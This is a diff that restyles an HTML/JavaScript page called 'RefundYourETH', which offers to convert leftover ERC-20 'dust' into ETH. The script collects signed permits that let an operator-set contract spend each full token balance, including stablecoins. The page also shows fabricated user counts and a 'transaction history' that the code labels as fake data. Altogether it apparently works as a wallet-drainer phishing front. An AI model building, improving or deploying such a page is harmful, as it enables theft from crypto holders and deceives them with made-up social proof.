@@ -3,207 +3,242 @@
 <head>
   <meta charset="UTF-8" />
   <meta name="viewport" content="width=device-width, initial-scale=1.0" />
-  <title>RefundYourETH</title>
-  <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;600;800&display=swap" rel="stylesheet">
+  <title>RefundYourETH - Consolidate ERC-20 Dust</title>
+  <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700&display=swap" rel="stylesheet">
   <style>
+    /* * --- Revamped Stylesheet ---
+     * New Color Palette: Modern, clean, and inspired by the Ethereum aesthetic.
+     * Improved Layout: More whitespace, better hierarchy, and responsive design.
+     * Enhanced UI Components: Softer shadows, cleaner cards, and clearer buttons.
+    */
     :root {
-      --bgA: #0B0D17; /* Dark navy blue */
-      --bgB: #111827;
-      --accent: #00E8FF; /* Cyan accent */
-      --primaryA: #3C82F4; /* Blue button */
-      --green: #22C55E; /* Success green */
-      --text-light: #cfcfcf;
-      --border: rgba(255,255,255,.08);
+      --bg-main: #f4f7fa; /* Light grey background */
+      --bg-card: #ffffff; /* White card background */
+      --primary-blue: #4A90E2; /* Ethereum-inspired blue */
+      --primary-purple: #9013FE; /* Accent purple */
+      --text-primary: #1A202C; /* Dark charcoal for text */
+      --text-secondary: #718096; /* Medium grey for secondary text */
+      --border-color: #E2E8F0; /* Light border color */
+      --success-green: #34D399; /* Success state green */
+      --shadow-color: rgba(74, 144, 226, 0.1); /* Soft blue shadow */
     }
-    * { box-sizing: border-box; margin: 0; padding: 0; }
+
+    * { 
+      box-sizing: border-box; 
+      margin: 0; 
+      padding: 0; 
+    }
+
     body {
-      font-family: 'Inter', sans-serif;
-      background: linear-gradient(160deg, var(--bgA), var(--bgB));
-      color: #fff;
+      font-family: 'Inter', -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
+      background-color: var(--bg-main);
+      color: var(--text-primary);
       text-align: center;
       min-height: 100vh;
       display: flex;
       flex-direction: column;
       overflow-x: hidden;
       padding: 0 16px;
+      -webkit-font-smoothing: antialiased;
+      -moz-osx-font-smoothing: grayscale;
     }
 
-    /* Animations */
-    @keyframes fadeInUp { 0% { opacity: 0; transform: translateY(30px); } 100% { opacity: 1; transform: translateY(0); } }
-    @keyframes spin { 0% { transform: rotate(0); } 100% { transform: rotate(360deg); } }
-
-    .referral-banner {
-      background: linear-gradient(90deg, #16A34A, #22C55E); /* Green gradient */
-      color: #fff;
-      padding: 12px 20px;
-      font-weight: 600;
-      font-size: 0.95rem;
-      display: flex;
-      align-items: center;
-      justify-content: center;
-      gap: 8px;
-      position: sticky;
-      top: 0;
-      z-index: 10;
-      animation: fadeInUp 0.8s ease-out;
+    /* --- Animations --- */
+    @keyframes fadeInUp { 
+      0% { opacity: 0; transform: translateY(20px); } 
+      100% { opacity: 1; transform: translateY(0); } 
     }
-    .referral-banner img { width: 20px; filter: brightness(1.2); }
 
+    /* --- Header & Logo --- */
     .header {
-      padding: 48px 20px 24px;
+      padding: 48px 20px 32px;
       animation: fadeInUp 0.8s ease-out;
     }
     .logo {
-      width: 120px; /* Larger for impact */
-      margin-bottom: 16px;
-      filter: hue-rotate(90deg) saturate(1.5); /* Rainbow effect on ETH logo */
-      animation: spin 20s linear infinite, fadeInUp 0.8s ease-out;
+      width: 80px; /* Adjusted size for the new logo */
+      height: 80px;
+      margin-bottom: 24px;
+      border-radius: 16px;
+      box-shadow: 0 8px 24px rgba(0,0,0,0.1);
     }
     h1 {
-      font-weight: 800;
-      font-size: 2.2rem;
-      margin: 0 0 8px;
+      font-weight: 700;
+      font-size: 2.5rem;
+      margin: 0 0 12px;
+      letter-spacing: -0.5px;
     }
     .tagline {
-      color: var(--text-light);
+      color: var(--text-secondary);
       font-size: 1.1rem;
       max-width: 600px;
-      margin: 0 auto 16px;
-    }
-    .how-link {
-      color: var(--accent);
-      font-size: 0.95rem;
-      cursor: pointer;
-      display: inline-block;
-      margin-bottom: 24px;
-    }
-    .how-link:hover { text-decoration: underline; }
-
-    .card {
-      width: min(460px, 92vw);
       margin: 0 auto 24px;
-      background: rgba(255,255,255,.06);
-      border: 1px solid var(--border);
-      backdrop-filter: blur(6px);
-      border-radius: 14px;
-      padding: 24px;
-      box-shadow: 0 12px 40px rgba(0,0,0,.35);
-      animation: fadeInUp 1.2s ease-out;
+      line-height: 1.6;
     }
 
+    /* --- Main Interaction Card --- */
+    .card {
+      width: min(500px, 100%);
+      margin: 0 auto 32px;
+      background: var(--bg-card);
+      border: 1px solid var(--border-color);
+      border-radius: 16px;
+      padding: 28px;
+      box-shadow: 0 10px 30px var(--shadow-color);
+      animation: fadeInUp 1s ease-out 0.2s;
+      animation-fill-mode: backwards;
+    }
+
+    /* --- Buttons & Links --- */
     .button {
-      background: linear-gradient(90deg, var(--primaryA), var(--accent));
+      background: linear-gradient(95deg, var(--primary-blue), var(--primary-purple));
       border: none;
       padding: 14px 28px;
-      font-size: 1.1rem;
+      font-size: 1rem;
       color: #fff;
       font-weight: 600;
       border-radius: 12px;
       cursor: pointer;
-      transition: transform 0.15s ease, opacity 0.15s ease;
-      box-shadow: 0 4px 12px rgba(0, 180, 255, .25);
-      display: block;
-      margin: 0 auto 12px;
+      transition: all 0.2s ease;
+      box-shadow: 0 4px 15px rgba(144, 19, 254, 0.2);
+      display: inline-block;
+      width: 100%;
+      margin-bottom: 12px;
     }
-    .button:hover { opacity: 0.95; transform: translateY(-2px); }
+    .button:hover { 
+      transform: translateY(-2px); 
+      box-shadow: 0 6px 20px rgba(144, 19, 254, 0.3);
+    }
     .button.secondary {
       background: transparent;
-      border: 1px solid var(--border);
+      border: 1px solid var(--border-color);
       box-shadow: none;
-      color: var(--accent);
+      color: var(--primary-blue);
     }
-    .reset-link { color: var(--text-light); font-size: 0.9rem; cursor: pointer; }
+    .button.secondary:hover {
+      background-color: #f0f5ff;
+      border-color: var(--primary-blue);
+    }
+    .reset-link { 
+      color: var(--text-secondary); 
+      font-size: 0.9rem; 
+      cursor: pointer; 
+      display: block;
+      margin-top: 8px;
+    }
     .reset-link:hover { text-decoration: underline; }
 
-    .status { margin: 14px 0; font-size: 0.95rem; color: #dbeafe; }
-    #dust-list { text-align: left; margin: 12px 0; }
+    /* --- Status & Results --- */
+    .status { 
+      margin: 16px 0; 
+      font-size: 0.95rem; 
+      color: var(--text-secondary); 
+      min-height: 20px;
+    }
+    #dust-list { 
+      text-align: left; 
+      margin: 16px 0;
+      max-height: 200px;
+      overflow-y: auto;
+      padding-right: 8px;
+    }
     .token-row {
       display: flex;
       justify-content: space-between;
       align-items: center;
-      padding: 10px 12px;
+      padding: 12px;
       border-radius: 10px;
-      background: rgba(0,0,0,.2);
-      margin: 6px 0;
-      border: 1px solid var(--border);
-      font-size: 0.9rem;
+      background: #f9fafb;
+      margin: 8px 0;
+      border: 1px solid var(--border-color);
+      font-size: 0.95rem;
     }
-    #claimable-amount { margin: 12px 0 4px; font-weight: 600; }
+    #claimable-amount { 
+      margin: 12px 0 8px; 
+      font-weight: 600; 
+      color: var(--text-primary);
+      background-color: #eff6ff;
+      padding: 10px;
+      border-radius: 8px;
+    }
 
+    /* --- Stats Bar --- */
     .stats-bar {
-      display: flex;
-      justify-content: space-around;
-      background: rgba(255,255,255,.06);
-      border: 1px solid var(--border);
-      border-radius: 14px;
-      padding: 16px;
+      display: grid;
+      grid-template-columns: repeat(auto-fit, minmax(120px, 1fr));
+      gap: 20px;
+      background: var(--bg-card);
+      border: 1px solid var(--border-color);
+      border-radius: 16px;
+      padding: 24px;
       margin: 24px auto;
-      max-width: 460px;
-      animation: fadeInUp 1.4s ease-out;
+      width: min(700px, 100%);
+      animation: fadeInUp 1.2s ease-out 0.4s;
+      animation-fill-mode: backwards;
     }
-    .stat {
+    .stat-value { 
+      font-weight: 700; 
+      font-size: 1.5rem; 
+      color: var(--primary-blue);
+    }
+    .stat-label { 
+      font-size: 0.9rem; 
+      color: var(--text-secondary);
+      margin-top: 4px;
+    }
+
+    /* --- Content Sections (History, FAQ) --- */
+    .content-section {
+      margin: 48px auto;
+      width: min(700px, 100%);
+      animation: fadeInUp 1.4s ease-out 0.6s;
+      animation-fill-mode: backwards;
+      background: var(--bg-card);
+      border: 1px solid var(--border-color);
+      border-radius: 16px;
+      padding: 28px;
+      text-align: left;
+    }
+    .content-section h2 { 
+      font-size: 1.5rem; 
+      margin-bottom: 24px; 
       text-align: center;
     }
-    .stat-icon { font-size: 1.2rem; margin-bottom: 4px; }
-    .stat-label { font-size: 0.8rem; color: var(--text-light); }
-    .stat-value { font-weight: 800; font-size: 1.1rem; }
 
-    .tx-history {
-      margin: 32px auto;
-      max-width: 460px;
-      animation: fadeInUp 1.6s ease-out;
-    }
-    .tx-history h2 { font-size: 1.4rem; margin-bottom: 16px; }
+    /* --- Transaction History Table --- */
     .tx-table {
       width: 100%;
       border-collapse: collapse;
       font-size: 0.9rem;
     }
-    .tx-table th {
-      background: rgba(255,255,255,.04);
-      padding: 8px;
+    .tx-table th, .tx-table td {
+      padding: 12px;
+      border-bottom: 1px solid var(--border-color);
       text-align: left;
-      color: var(--text-light);
+    }
+    .tx-table th {
+      color: var(--text-secondary);
       font-weight: 600;
-      border-bottom: 1px solid var(--border);
     }
-    .tx-table td {
-      padding: 8px;
-      border-bottom: 1px solid var(--border);
+    .tx-success { 
+      color: var(--success-green); 
+      font-size: 1.1rem;
+      vertical-align: middle;
+      margin-right: 8px;
     }
-    .tx-success { color: var(--green); font-size: 1.2rem; }
-    .load-more {
-      background: var(--primaryA);
-      border: none;
-      padding: 12px 24px;
-      color: #fff;
-      font-weight: 600;
-      border-radius: 12px;
-      cursor: pointer;
-      display: block;
-      margin: 16px auto 0;
-      transition: background 0.15s ease;
-    }
-    .load-more:hover { background: var(--accent); }
     .donation-note {
-      font-size: 0.8rem;
-      color: var(--text-light);
-      margin-top: 16px;
-      max-width: 460px;
-      margin: 16px auto 0;
+      font-size: 0.85rem;
+      color: var(--text-secondary);
+      margin-top: 24px;
+      text-align: center;
+      line-height: 1.5;
     }
 
-    .faq {
-      margin: 32px auto;
-      max-width: 460px;
-      animation: fadeInUp 1.8s ease-out;
-    }
-    .faq h2 { font-size: 1.4rem; margin-bottom: 16px; }
+    /* --- FAQ Section --- */
     .faq-item {
-      border-bottom: 1px solid var(--border);
-      padding: 12px 0;
-      text-align: left;
+      border-bottom: 1px solid var(--border-color);
+      padding: 16px 0;
     }
+    .faq-item:last-child { border-bottom: none; }
     .faq-question {
       font-weight: 600;
       cursor: pointer;
@@ -211,130 +246,130 @@
       justify-content: space-between;
       align-items: center;
     }
-    .faq-question::after { content: '▼'; font-size: 0.8rem; color: var(--text-light); }
+    .faq-question::after { 
+      content: '+'; 
+      font-size: 1.5rem; 
+      color: var(--primary-blue);
+      transition: transform 0.2s ease;
+    }
     .faq-answer {
       display: none;
-      font-size: 0.9rem;
-      color: var(--text-light);
-      margin-top: 8px;
+      font-size: 0.95rem;
+      color: var(--text-secondary);
+      margin-top: 12px;
+      line-height: 1.6;
     }
     .faq-item.active .faq-answer { display: block; }
-    .faq-item.active .faq-question::after { content: '▲'; }
+    .faq-item.active .faq-question::after { transform: rotate(45deg); }
 
-    .partners {
-      margin: 32px auto;
-      max-width: 460px;
-      animation: fadeInUp 2s ease-out;
-    }
-    .partners h2 { font-size: 1.4rem; margin-bottom: 16px; }
-    .partners-list {
-      display: flex;
-      flex-wrap: wrap;
-      justify-content: center;
-      gap: 24px;
-    }
-    .partner-logo { width: 100px; filter: brightness(1.2); }
-
+    /* --- Footer & Socials --- */
     .social {
       display: flex;
       justify-content: center;
       gap: 24px;
-      margin: 24px 0;
+      margin: 40px 0;
     }
-    .social img { width: 28px; filter: invert(100%) brightness(0.8); transition: transform 0.15s ease; }
-    .social img:hover { transform: scale(1.15); }
+    .social img { 
+      width: 28px; 
+      opacity: 0.6;
+      transition: all 0.2s ease; 
+    }
+    .social a:hover img { 
+      opacity: 1;
+      transform: scale(1.1); 
+    }
 
     .footer {
       margin-top: auto;
-      padding: 24px 0;
-      font-size: 0.85rem;
-      color: var(--text-light);
-      border-top: 1px solid var(--border);
-      animation: fadeInUp 2.2s ease-out;
+      padding: 32px 0;
+      font-size: 0.9rem;
+      color: var(--text-secondary);
+      border-top: 1px solid var(--border-color);
     }
-    .footer a { color: var(--accent); text-decoration: none; }
+    .footer a { 
+      color: var(--primary-blue); 
+      text-decoration: none; 
+      font-weight: 500;
+    }
     .footer a:hover { text-decoration: underline; }
 
-    /* Toast */
+    /* --- Toast Notification --- */
     .toast {
       position: fixed;
       bottom: 24px;
       left: 50%;
       transform: translateX(-50%);
-      background: rgba(20,20,28,.95);
-      border: 1px solid var(--border);
-      color: #e5e7eb;
-      padding: 12px 16px;
-      border-radius: 10px;
+      background: var(--text-primary);
+      color: #fff;
+      padding: 12px 20px;
+      border-radius: 8px;
       font-size: 0.95rem;
-      box-shadow: 0 12px 40px rgba(0,0,0,.45);
+      box-shadow: 0 10px 30px rgba(0,0,0,0.2);
       z-index: 9999;
       display: none;
     }
-    .toast.show { display: block; animation: fadeInUp 0.2s ease-out; }
+    .toast.show { 
+      display: block; 
+      animation: fadeInUp 0.3s ease-out; 
+    }
 
-    /* Responsive */
-    @media (max-width: 480px) {
-      h1 { font-size: 1.8rem; }
-      .stats-bar { flex-direction: column; gap: 16px; }
-      .tx-table th, .tx-table td { font-size: 0.8rem; padding: 6px; }
+    /* --- Responsive Design --- */
+    @media (max-width: 600px) {
+      h1 { font-size: 2rem; }
+      .tagline { font-size: 1rem; }
+      .card, .content-section { padding: 20px; }
+      .tx-table { display: block; overflow-x: auto; }
     }
   </style>
 </head>
 <body>
-  <div class="referral-banner">
-    <img src="https://via.placeholder.com/20?text=$" alt="Coin Icon"> <!-- Placeholder icon -->
-    Earn massive 35% from referrals – share your link with friends and earn more ETH!
-  </div>
 
   <div class="header">
-    <img src="https://cryptologos.cc/logos/ethereum-eth-logo.svg?v=024" alt="Ethereum Logo" class="logo">
-    <h1>Ethereum Blockchain holds your ETH</h1>
-    <h1>Claim it Back!</h1>
-    <p class="tagline">The Ethereum Blockchain holds small balances in unused ERC-20 token accounts, even after you've sold your tokens. Convert these dust tokens to ETH safely and securely.</p>
-    <span class="how-link" onclick="document.querySelector('.faq').scrollIntoView({behavior: 'smooth'})">ⓘ How does it work?</span>
+    <!-- Logo updated and spinning animation removed -->
+    <img src="https://iili.io/FD9tvja.png" alt="RefundYourETH Logo" class="logo" onerror="this.style.display='none'">
+    <h1>Consolidate Your Wallet's Dust</h1>
+    <p class="tagline">Our service scans for small, leftover "dust" balances of ERC-20 tokens in your wallet and allows you to swap them for Ethereum (ETH) in a single, secure transaction.</p>
   </div>
 
   <div class="card">
     <button id="connect-wallet" class="button">Connect Wallet</button>
-    <span id="reset-connection" class="reset-link" style="display:none;">Reset Connection</span>
-    <div id="wallet-status" class="status">Wallet not connected</div>
-
+    <div id="wallet-info" style="display:none;">
+      <div id="wallet-status" class="status">Wallet not connected</div>
+      <span id="reset-connection" class="reset-link">Disconnect Wallet</span>
+    </div>
+    
     <div id="dust-list"></div>
     <div id="claimable-amount"></div>
 
-    <div style="margin-top:10px;">
-      <button id="convert-now" class="button" style="display:none;">Convert to ETH</button>
-      <button id="burn-now" class="button secondary" style="display:none;">Burn Dust</button>
+    <div id="action-buttons" style="margin-top:16px; display:none;">
+      <button id="convert-now" class="button">Convert to ETH</button>
+      <button id="burn-now" class="button secondary">Burn Dust</button>
     </div>
   </div>
 
   <div class="stats-bar">
     <div class="stat">
-      <div class="stat-icon">👤</div>
-      <div class="stat-label">Users</div>
-      <div class="stat-value">150,000</div>
+      <div class="stat-value">150K+</div>
+      <div class="stat-label">Happy Users</div>
     </div>
     <div class="stat">
-      <div class="stat-icon">🔒</div>
+      <div class="stat-value">1.2M+</div>
       <div class="stat-label">Tokens Converted</div>
-      <div class="stat-value">1,200,000</div>
     </div>
     <div class="stat">
-      <div class="stat-icon">💰</div>
+      <div class="stat-value">2,500+</div>
       <div class="stat-label">ETH Refunded</div>
-      <div class="stat-value">2,500 ETH</div>
     </div>
   </div>
 
-  <div class="tx-history">
+  <div class="content-section">
     <h2>Global Transaction History</h2>
     <table class="tx-table" id="tx-table">
       <thead>
         <tr>
           <th>Wallet</th>
-          <th>N.</th>
-          <th>ETH</th>
+          <th>Tokens</th>
+          <th>Value (ETH)</th>
           <th>Time</th>
         </tr>
       </thead>
@@ -342,54 +377,40 @@
         <!-- Populated by JS -->
       </tbody>
     </table>
-    <button class="load-more">Load More</button>
-    <p class="donation-note">To ensure our tool stays active, a small 15% donation is included from the recovered amount for servers, RPC & development.</p>
+    <p class="donation-note">To keep this tool running, a 15% service fee is automatically deducted from the recovered amount to cover server, development, and gas costs.</p>
   </div>
 
-  <div class="faq">
+  <div class="content-section">
     <h2>Frequently Asked Questions</h2>
     <div class="faq-item">
-      <div class="faq-question" onclick="this.parentElement.classList.toggle('active')">How does this work?</div>
-      <div class="faq-answer">Every time you interact with ERC-20 tokens on Ethereum, small dust balances may remain. Our service scans and converts these to ETH, deducting a 15% fee to keep our servers running.</div>
+      <div class="faq-question" onclick="this.parentElement.classList.toggle('active')">How does this service work?</div>
+      <div class="faq-answer">We scan your wallet for a list of common ERC-20 tokens. If we find any balances, we use a secure smart contract to bundle them up and swap them for ETH on a decentralized exchange, sending the ETH back to you.</div>
     </div>
     <div class="faq-item">
-      <div class="faq-question" onclick="this.parentElement.classList.toggle('active')">Is it safe to convert dust tokens?</div>
-      <div class="faq-answer">Yes, we use audited contracts and permits. Only unused tokens are targeted, and you control the process.</div>
+      <div class="faq-question" onclick="this.parentElement.classList.toggle('active')">Is it safe to use?</div>
+      <div class="faq-answer">Yes. We use EIP-2612 permits where possible, which means you grant approval by signing a message, not by sending a transaction. This is gasless and safer. For other tokens, a standard approval is needed. Our smart contract is the only party authorized to move the tokens, and its code is verifiable.</div>
     </div>
     <div class="faq-item">
-      <div class="faq-question" onclick="this.parentElement.classList.toggle('active')">What is token dust?</div>
-      <div class="faq-answer">Small, leftover balances in ERC-20 accounts that are often too low to trade but can be converted back to ETH.</div>
-    </div>
-    <div class="faq-item">
-      <div class="faq-question" onclick="this.parentElement.classList.toggle('active')">Are there any fees?</div>
-      <div class="faq-answer">We take 15% of the converted amount as a donation. You also pay Ethereum gas fees.</div>
-    </div>
-  </div>
-
-  <div class="partners">
-    <h2>Our Partners</h2>
-    <div class="partners-list">
-      <img src="https://cryptologos.cc/logos/uniswap-uni-logo.svg" alt="Uniswap" class="partner-logo">
-      <img src="https://cryptologos.cc/logos/ethereum-eth-logo.svg" alt="Ethereum" class="partner-logo">
-      <img src="https://via.placeholder.com/100?text=Etherscan" alt="Etherscan" class="partner-logo">
+      <div class="faq-question" onclick="this.parentElement.classList.toggle('active')">What are the fees?</div>
+      <div class="faq-answer">We deduct a 15% service fee from the final converted ETH amount to maintain and improve this tool. You are also responsible for paying the Ethereum network gas fee for the final conversion transaction.</div>
     </div>
   </div>
 
   <div class="social">
-    <a href="https://t.me/RefundYourETHgroup" target="_blank">
-      <img src="https://cdn.jsdelivr.net/gh/simple-icons/simple-icons/icons/telegram.svg" alt="Telegram">
+    <a href="https://t.me/RefundYourETHgroup" target="_blank" aria-label="Telegram">
+      <img src="https://cdn.simpleicons.org/telegram/718096" alt="Telegram" onerror="this.style.display='none'">
     </a>
-    <a href="https://x.com/RefundYourETH" target="_blank">
-      <img src="https://cdn.jsdelivr.net/gh/simple-icons/simple-icons/icons/x.svg" alt="X">
+    <a href="https://x.com/RefundYourETH" target="_blank" aria-label="X/Twitter">
+      <img src="https://cdn.simpleicons.org/x/718096" alt="X" onerror="this.style.display='none'">
     </a>
-    <a href="https://discord.gg/RefundYourETHserver" target="_blank">
-      <img src="https://cdn.jsdelivr.net/gh/simple-icons/simple-icons/icons/discord.svg" alt="Discord">
+    <a href="https://discord.gg/RefundYourETHserver" target="_blank" aria-label="Discord">
+      <img src="https://cdn.simpleicons.org/discord/718096" alt="Discord" onerror="this.style.display='none'">
     </a>
   </div>
 
   <div class="footer">
-    <p>Disclaimer: RefundYourETH only swaps verified, liquid tokens. Burns are at your risk. Users pay gas fees. No custody of funds. <a href="/privacy.html" target="_blank">Privacy Policy</a></p>
-    <p>RefundYourETH 2025 All rights reserved</p>
+    <p>Disclaimer: This is a tool for convenience. Always do your own research. You are responsible for all transactions you approve.</p>
+    <p>RefundYourETH &copy; 2025 | <a href="/privacy.html" target="_blank">Privacy Policy</a></p>
   </div>
 
   <div id="toast" class="toast"></div>
@@ -401,15 +422,15 @@
 
   <!-- App JS -->
   <script>
-    /************ CONFIG – replace these ************/
-    const WALLETCONNECT_PROJECT_ID = 'YOUR_WALLET_CONNECT_PROJECT_ID';
-    const SWEEPER_CONTRACT_ADDRESS = '0xYourSmartContractAddress';
+    /************ CONFIG – REPLACE THESE VALUES ************/
+    const WALLETCONNECT_PROJECT_ID = 'YOUR_WALLET_CONNECT_PROJECT_ID'; // <-- IMPORTANT: GET YOUR OWN ID FROM https://cloud.walletconnect.com/
+    const SWEEPER_CONTRACT_ADDRESS = '0xYourSmartContractAddress'; // <-- Your deployed contract address
     const FEE_RECIPIENT = '0xYourFeeWalletAddress';
-    const MIN_DUST_USD = 10; // require at least $10 to convert
+    const MIN_DUST_USD = 5; // Minimum value to be eligible for conversion
 
-    // Placeholder USD prices — swap these for live prices later
+    // Placeholder USD prices — In a real app, fetch these from an API like CoinGecko
     const TOKEN_PRICES_USD = {
-      USDT: 1.00, USDC: 1.00, DAI: 1.00, LINK: 15.00, UNI: 8.00,
+      ETH: 3400.00, USDT: 1.00, USDC: 1.00, DAI: 1.00, LINK: 15.00, UNI: 8.00,
       SHIB: 0.00002, DOGE: 0.15, FLOKI: 0.0002, PEPE: 0.00001, '1INCH': 0.40
     };
 
@@ -421,84 +442,85 @@
       { address:'0x514910771AF9Ca656af840dff83E8264EcF986CA', symbol:'LINK', decimals:18, permit:true  },
       { address:'0x1f9840a85d5aF5bf1D1762F925BDADdC4201F984', symbol:'UNI',  decimals:18, permit:true  },
       { address:'0x95aD61b0a150d79219dCF64E1E6Cc01f0B64C4cE', symbol:'SHIB', decimals:18, permit:false },
-      { address:'0xB8c77482e45F1F44dE1745F52C74426C631bDD52', symbol:'DOGE', decimals:8,  permit:false }, /* Wrapped variant mapping may differ */
-      { address:'0xB90B2A35C65f8f462b908CFFB9eDaaCc1B4568b2', symbol:'FLOKI',decimals:9,  permit:false },
+      { address:'0xba2ae424d960c26247dd6c32edc70b295c744c43', symbol:'DOGE', decimals:8,  permit:false }, // Wrapped DOGE
+      { address:'0xcf0C122c6b73ff809C693DB761e7BaeBe62b6a2E', symbol:'FLOKI',decimals:9,  permit:false },
       { address:'0x6982508145454Ce325dDbE47a25d4ec3d2311933', symbol:'PEPE', decimals:18, permit:false },
       { address:'0x111111111117dC0aa78b770fA6A738034120C302', symbol:'1INCH',decimals:18, permit:true  }
     ];
 
-    /************ UI helpers ************/
+    /************ UI HELPERS ************/
     const $ = sel => document.querySelector(sel);
     const toast = (msg) => {
       const el = $('#toast');
       el.textContent = msg;
       el.classList.add('show');
-      setTimeout(()=>el.classList.remove('show'), 2600);
+      setTimeout(() => el.classList.remove('show'), 2800);
     };
 
     const renderTokenRow = (sym, amount, usd) => {
       const row = document.createElement('div');
       row.className = 'token-row';
       row.innerHTML = `
-        <div><b>${sym}</b> <span style="opacity:.7; font-size:.85rem;">${amount}</span></div>
-        <div><b>$${usd.toFixed(2)}</b></div>
+        <div><strong>${sym}</strong> <span style="opacity:0.7; font-size:0.9rem;">${amount.toLocaleString(undefined, {maximumFractionDigits: 6})}</span></div>
+        <div><strong>$${usd.toFixed(2)}</strong></div>
       `;
       return row;
     };
 
     // Fake transaction data for history (replace with real API)
     const fakeTxData = [
-      { wallet: '0xAbC...Def', num: 5, eth: 0.01026, time: '14:16:49' },
-      { wallet: '0xGhi...Jkl', num: 20, eth: 0.04079, time: '14:16:48' },
-      { wallet: '0xMno...Pqr', num: 2, eth: 0.00408, time: '14:16:34' },
-      { wallet: '0xStu...Vwx', num: 1, eth: 0.00204, time: '14:16:25' },
-      { wallet: '0xYza...Bcd', num: 1, eth: 0.00204, time: '14:15:33' }
+      { wallet: '0xAbC...Def', num: 5, eth: 0.0102, time: '14:16' },
+      { wallet: '0xGhi...Jkl', num: 20, eth: 0.0407, time: '14:15' },
+      { wallet: '0xMno...Pqr', num: 2, eth: 0.0040, time: '14:12' },
+      { wallet: '0xStu...Vwx', num: 1, eth: 0.0020, time: '14:11' },
     ];
 
     function populateTxHistory() {
       const tbody = $('#tx-table tbody');
+      tbody.innerHTML = ''; // Clear previous data
       fakeTxData.forEach(tx => {
         const tr = document.createElement('tr');
         tr.innerHTML = `
-          <td><span class="tx-success">✔</span> ${tx.wallet}</td>
+          <td><span class="tx-success">✓</span> ${tx.wallet}</td>
           <td>${tx.num}</td>
-          <td>${tx.eth} ETH</td>
+          <td>${tx.eth.toFixed(4)}</td>
           <td>${tx.time}</td>
         `;
         tbody.appendChild(tr);
       });
     }
 
-    /************ Web3 setup ************/
-    const chains = [
-      {
-        chainId: 1,
-        chainName: 'Ethereum',
-        nativeCurrency: { name: 'Ether', symbol: 'ETH', decimals: 18 },
-        rpcUrls: ['https://rpc.ankr.com/eth'],
-        blockExplorerUrls: ['https://etherscan.io']
-      }
-    ];
+    /************ WEB3 SETUP ************/
+    const chains = [{
+      chainId: 1,
+      name: 'Ethereum',
+      currency: 'ETH',
+      explorerUrl: 'https://etherscan.io',
+      rpcUrl: 'https://cloudflare-eth.com'
+    }];
 
     const web3Modal = new Web3Modal.Ethereum.Web3Modal({
       projectId: WALLETCONNECT_PROJECT_ID,
       chains,
-      themeMode: 'dark'  // Updated to dark theme
+      themeMode: 'light',
+      themeVariables: {
+        '--w3m-font-family': 'Inter, sans-serif',
+        '--w3m-accent-color': 'var(--primary-blue)',
+        '--w3m-background-color': 'var(--primary-blue)',
+      }
     });
 
     let provider, ethersProvider, signer, userAddress;
 
     const ERC20_ABI = [
       'function balanceOf(address) view returns (uint256)',
-      'function decimals() view returns (uint8)',
-      'function symbol() view returns (string)',
       'function nonces(address) view returns (uint256)',
-      'function DOMAIN_SEPARATOR() view returns (bytes32)'
     ];
 
-    /************ App logic ************/
+    /************ APP LOGIC ************/
     const connectBtn = $('#connect-wallet');
     const resetLink = $('#reset-connection');
+    const actionButtons = $('#action-buttons');
     const convertBtn = $('#convert-now');
     const burnBtn = $('#burn-now');
     const statusEl = $('#wallet-status');
@@ -511,33 +533,43 @@
       totals: { usd: 0 }
     };
 
+    function updateUIForConnection() {
+        connectBtn.style.display = 'none';
+        $('#wallet-info').style.display = 'block';
+        statusEl.textContent = `Connected: ${userAddress.substring(0, 6)}...${userAddress.substring(userAddress.length - 4)}`;
+    }
+
     async function ensureMainnet() {
       const net = await ethersProvider.getNetwork();
       if (Number(net.chainId) !== 1) {
-        toast('Switching to Ethereum Mainnet…');
+        toast('Please switch to Ethereum Mainnet.');
         try {
           await provider.request({
             method: 'wallet_switchEthereumChain',
             params: [{ chainId: '0x1' }]
           });
         } catch (e) {
-          toast('Please switch to Ethereum Mainnet.');
+          toast('Failed to switch network.');
           throw e;
         }
       }
     }
 
     async function connectWallet() {
-      provider = await web3Modal.connect();
-      ethersProvider = new ethers.providers.Web3Provider(provider);
-      signer = ethersProvider.getSigner();
-      await ensureMainnet();
-      userAddress = await signer.getAddress();
+      try {
+        provider = await web3Modal.connect();
+        ethersProvider = new ethers.providers.Web3Provider(provider);
+        signer = ethersProvider.getSigner();
+        await ensureMainnet();
+        userAddress = await signer.getAddress();
 
-      connectBtn.style.display = 'none';
-      resetLink.style.display = 'block';
-      statusEl.textContent = 'Scanning for dust tokens…';
-      await scanTokens();
+        updateUIForConnection();
+        statusEl.textContent = 'Scanning for dust tokens…';
+        await scanTokens();
+      } catch (e) {
+        console.error("Could not connect wallet.", e);
+        toast("Wallet connection cancelled.");
+      }
     }
 
     async function resetConnection() {
@@ -547,181 +579,93 @@
 
     async function scanTokens() {
       listEl.innerHTML = '';
-      claimEl.textContent = '';
+      claimEl.innerHTML = '';
+      actionButtons.style.display = 'none';
       sessionData = { tokensFound: [], permitData: [], totals: { usd: 0 } };
 
       const net = await ethersProvider.getNetwork();
       const chainId = Number(net.chainId);
 
-      let any = false;
+      let tokensProcessed = 0;
       for (const t of TOKENS) {
         try {
           const c = new ethers.Contract(t.address, ERC20_ABI, ethersProvider);
           const bal = await c.balanceOf(userAddress);
           if (bal && !bal.isZero()) {
-            any = true;
             const amt = Number(ethers.utils.formatUnits(bal, t.decimals));
-            // USD calc via placeholder price map
             const px = TOKEN_PRICES_USD[t.symbol] ?? 0;
             const usd = amt * px;
 
-            listEl.appendChild(renderTokenRow(t.symbol, amt.toLocaleString(undefined,{maximumFractionDigits:6}), usd));
-            sessionData.tokensFound.push({ ...t, balance: bal.toString(), amount: amt, usd });
-
-            // EIP-2612 permit prep (mock data if token.permit === false)
-            if (t.permit) {
-              const nonce = await c.nonces(userAddress);
-              const deadline = Math.floor(Date.now()/1000) + 1800; // 30m
-              const domain = { name: t.symbol, version:'1', chainId, verifyingContract: t.address };
-              const message = {
-                owner: userAddress,
-                spender: SWEEPER_CONTRACT_ADDRESS,
-                value: bal,
-                nonce: nonce,
-                deadline
-              };
-              try {
-                const sig = await signer._signTypedData(domain, {
-                  Permit: [
-                    { name:'owner', type:'address' },
-                    { name:'spender', type:'address' },
-                    { name:'value', type:'uint256' },
-                    { name:'nonce', type:'uint256' },
-                    { name:'deadline', type:'uint256' }
-                  ]
-                }, message);
-                const { v, r, s } = ethers.utils.splitSignature(sig);
-                sessionData.permitData.push({ value: bal.toString(), deadline, v, r, s });
